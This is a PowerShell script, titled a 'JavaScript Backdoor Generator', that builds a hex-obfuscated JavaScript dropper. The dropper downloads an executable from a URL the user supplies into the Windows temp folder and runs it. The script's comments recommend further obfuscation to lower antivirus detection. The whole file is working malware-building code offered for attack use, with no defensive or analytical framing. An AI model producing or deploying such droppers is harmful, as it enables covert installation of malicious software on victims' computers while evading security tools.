#JavaScript Backdoor Generator
#Don't forget to light obfuscate any online obfuscator can be used too
# AV detection gets quite low

$payload = Read-Host 'Pleace specify your payload (example :- http://website.com/payload.exe) ?'
$process = Read-Host 'Please specify a proccess name (example :- lol)?'
$filename = Read-Host 'Please Specify output filename (example :- example.js) '
$OutputPath = "$env:USERPROFILE\Desktop\$filename"


# JavaScript Payload :P
$cmd = @"
    var myActXobj=this['\x41\x63\x74\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74'];var myShell=new myActXobj('\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c');var myHTTP=new myActXobj('\x4d\x53\x58\x4d\x4c\x32\x2e\x58\x4d\x4c\x48\x54\x54\x50');var myTempPath=myShell['\x45\x78\x70\x61\x6e\x64\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x53\x74\x72\x69\x6e\x67\x73']('\x25\x54\x45\x4d\x50\x25');function dropperFunc(_0x476049,_0x1bbf1b){var _0x4deb99=myTempPath+'\x2f'+_0x1bbf1b+'\x2e\x65\x78\x65';myHTTP['\x6f\x70\x65\x6e']('\x47\x45\x54',_0x476049,![]);myHTTP['\x73\x65\x6e\x64']();if(myHTTP['\x73\x74\x61\x74\x75\x73']==0xc8){var _0x46ad76=new myActXobj('\x41\x44\x4f\x44\x42\x2e\x53\x74\x72\x65\x61\x6d');_0x46ad76['\x6f\x70\x65\x6e']();_0x46ad76['\x74\x79\x70\x65']=0x1;_0x46ad76['\x77\x72\x69\x74\x65'](myHTTP['\x52\x65\x73\x70\x6f\x6e\x73\x65\x42\x6f\x64\x79']);_0x46ad76['\x70\x6f\x73\x69\x74\x69\x6f\x6e']=0x0;_0x46ad76['\x73\x61\x76\x65\x54\x6f\x46\x69\x6c\x65'](_0x4deb99,0x2);_0x46ad76['\x63\x6c\x6f\x73\x65']();myShell['\x52\x75\x6e'](_0x4deb99,0x1,0x0);}}dropperFunc('$payload','$process');

"@

Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default

Write-Output "[+] File has been written to $env:APPDATA\Desktop\$filename [+]"
